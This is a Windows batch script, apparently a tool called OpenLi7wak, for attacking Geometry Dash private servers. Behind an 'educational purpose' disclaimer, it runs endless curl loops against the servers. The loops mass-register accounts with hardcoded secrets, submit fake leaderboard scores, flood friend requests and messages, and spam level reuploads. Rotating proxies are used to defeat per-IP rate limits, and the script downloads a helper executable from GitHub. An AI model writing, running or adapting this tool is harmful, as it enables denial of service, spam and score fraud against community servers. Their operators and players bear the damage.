@echo off
setlocal enabledelayedexpansion
set state=start
if NOT exist "%localappdata%\OpenLi7wak" (
md "%localappdata%\OpenLi7wak"
) 
if exist "%localappdata%\OpenLi7wak\proxy.txt" (
set /p proxied=<%localappdata%\OpenLi7wak\proxy.txt
)
if exist "%localappdata%\OpenLi7wak\encode.exe" (
  set FileName="%localappdata%\OpenLi7wak\encode.exe"
) else (
set state=choice
)
:cl
cls
:::    ____                   _      _ ______              _    
:::   / __ \                 | |    (_)____  |            | |   
:::  | |  | |_ __   ___ _ __ | |     _    / /_      ____ _| | __
:::  | |  | | '_ \ / _ \ '_ \| |    | |  / /\ \ /\ / / _` | |/ /
:::  | |__| | |_) |  __/ | | | |____| | / /  \ V  V / (_| |   < 
:::   \____/| .__/ \___|_| |_|______|_|/_/    \_/\_/ \__,_|_|\_\
:::         | |                                                 
:::         |_|     
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A             
echo.          
echo For EDUCATIONAL purpose! ONLY on your OWN GDPS
echo GDPS Owner may publicly disclose your IP address if the tool is used without EXPLICIT CONSENT
goto %state%                                                                                  
:start
echo --- CHOOSE OPTION ---
echo [1] Reupload SPAM
echo [2] Leaderboard DoS
echo [3] Message SPAM
echo --- PROXY OPTIONS ---
echo [4] Add proxy
echo [5] Test proxy
echo [6] Delete proxy settings
echo --- OTHER OPTIONS ---
echo [7] Credits ^& Legal
echo [8] Exit
set /p op=
if %op%==1 set state=ru
if %op%==2 set state=ls
if %op%==3 set state=ms
if %op%==4 set state=px
if %op%==5 set state=tp
if %op%==6 del %localappdata%\OpenLi7wak\proxy.txt
if %op%==7 set state=cr
if %op%==8 exit
goto cl
:cr
set state=start
echo.
echo OpenLi7wak was made by Jean for helping people into understanding the vulnerabilities that GDPSes have.
echo OpenLi7wak was inspired of the paid tool: Lunatic Raider, from Paradoxum
echo I condemn the usage of Lunatic Raider for nefarious purposes
echo OpenLi7wak is under the GNU GPL v3 LICENSE
pause
echo.
start http://www.gnu.org/licenses/gpl-3.0.en.html
goto cl
:tp
set state=start
set test="curl %proxied% -s https://api64.ipify.org/"
for /f "usebackq delims=" %%a in (`!test!`) do (
  echo Your IP is: %%a
)
pause > nul
goto cl
:px
set state=start
echo.
echo You can use a (rotating) proxy with OpenLi7wak to prove to zSpunky that adding a timeout per ip is a skill issue
echo You can get one at webshare.io (not affiliated), though may be slow...
echo.
set /p pra=Proxy address: 
set /p pru=Proxy username: 
set /p prp=Proxy password: 
set /p pro=Proxy PORT: 
echo.
echo Are the following values correct?
echo Proxy address: %pra%
echo Proxy username: %pru%
echo Proxy password: %prp%
echo Proxy PORT: %pro%
echo.
echo [y]es / [N]o
set /p conf2=
if %conf2%==y goto pset
if %conf2%==Y goto pset
goto px
:pset
echo --proxy "http://%pru%:%prp%@%pra%:%pro%" > %localappdata%\OpenLi7wak\proxy.txt
goto cl
:ms
set state=start
set /a nb=0 > nul
set /p host=Host (https://gdps.com/database): 
set /p pass=Please give a password to be used: 
for /f "delims=" %%a in ('%FileName% %pass%') do set "password=%%a"
echo Running... Sit tight...
:s
set /a nb+=1 > nul
set username=Li7wak %random%%random%
curl %proxied% %host%/tools/account/registerAccount.php -X POST -d "username=%username%&password=%pass%&proxy=1&repeatpassword=%pass%&email=a@a.a&repeatemail=a@a.a" > nul
set "iatecement=curl %proxied% %host%/accounts/loginGJAccount.php -X POST -d "udid=1^&userName=%username%^&password=%pass%^&secret=Wmfv3899gc9""
set "response="
for /f "usebackq delims=" %%a in (`!iatecement!`) do (
  set "response=%%a"
)
for /f "tokens=1 delims=," %%a in ("%response%") do (
  set "aid=%%a"
)
curl %proxied% -X POST -d "accountID=%aid%&gjp=%password%&toAccountID=%nb%&subject=TGk3d2Fr&comment=TGk3d2Fr&secret=Wmfd2893gb7" %host%/uploadFriendRequest20.php > nul
curl %proxied% -X POST -d "accountID=%aid%&gjp=%password%&toAccountID=%nb%&subject=TGk3d2Fr&body=TGk3d2Fr&secret=Wmfd2893gb7" %host%/uploadGJMessage20.php > nul
echo.
echo Ran
goto :s
goto cl

:ls
set state=start
set /p host=Host (https://gdps.com/database): 
set /p pass=Please give a password to be used: 
for /f "delims=" %%a in ('%FileName% %pass%') do set "password=%%a"
echo Running... Sit tight...
:q
set username=Li7wak %random%%random%
curl %proxied% %host%/tools/account/registerAccount.php -X POST -d "username=%username%&password=%pass%&proxy=1&repeatpassword=%pass%&email=a@a.a&repeatemail=a@a.a" > nul
set "iatecement=curl %proxied% %host%/accounts/loginGJAccount.php -X POST -d "udid=1^&userName=%username%^&password=%pass%^&secret=Wmfv3899gc9""
set "response="
for /f "usebackq delims=" %%a in (`!iatecement!`) do (
  set "response=%%a"
)
for /f "tokens=1 delims=," %%a in ("%response%") do (
  set "aid=%%a"
)
curl %proxied% -X POST -d "accountID=%aid%&gjp=%password%&userName=%username%&stars=99999&demons=99999&diamonds=99999&icon=107&color1=29&color2=6&iconType=0&coins=150&userCoins=6969&secret=Wmfd2893gb7" %host%/updateGJUserScore22.php > nul
echo.
echo Ran
goto :q
goto cl
:ru
echo You will provide the following info: Bug URL (gdps containing the bug code)
echo and the target GDPS to spam (eg https://anygdps.ps.fhgdps.com)
echo.
set /p origin=Enter the bug GDPS url (full path): 
set /p target=Enter the GDPS url: 
echo Are the following information correct?
echo.
echo Origin: %origin%
echo Target: %target%
echo [y]es / [N]o
set /p conf1=
if %conf1%==y goto a
if %conf1%==Y goto a
set state=ru
goto cl
:a
curl %proxied% -X POST -d "levelid=%random%&server=%origin%&proxy=1&debug=0" %target%/tools/levelReupload.php
goto :a
set state=start
goto cl
:choice
set state=start
echo encode.exe not found... You can
echo.
echo [1] Download it
echo [2] Import it
set /p file=
if %file%==1 goto crl
set pwshcmd=powershell -noprofile -command "&{[System.Reflection.Assembly]::LoadWithPartialName('System.windows.forms') | Out-Null;$OpenFileDialog = New-Object System.Windows.Forms.OpenFileDialog; $OpenFileDialog.ShowDialog()|out-null; $OpenFileDialog.FileName}"
for /f "delims=" %%I in ('%pwshcmd%') do set "FileName=%%I"
copy "%FileName%" "%localappdata%\OpenLi7wak\encode.exe"
set FileName=%localappdata%\OpenLi7wak\encode.exe
goto cl
:crl
curl https://github.com/masckmaster2007/OpenLi7wak/releases/download/v1/encode.exe --output "%localappdata%\OpenLi7wak\encode.exe" -L
set FileName=%localappdata%\OpenLi7wak\encode.exe
goto cl
endlocal
pause>nul